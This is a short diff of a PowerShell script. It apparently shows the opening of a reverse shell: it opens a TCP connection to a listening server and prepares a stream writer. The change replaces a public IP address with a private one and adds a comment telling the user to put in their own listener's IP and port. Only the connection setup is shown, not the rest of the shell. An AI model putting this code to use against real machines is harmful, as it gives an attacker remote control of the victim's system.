@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('89.72.157.138', 5454);
+$socket = new-object System.Net.Sockets.TcpClient('192.168.0.101', 5454); #change IP and port to your own listening server
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
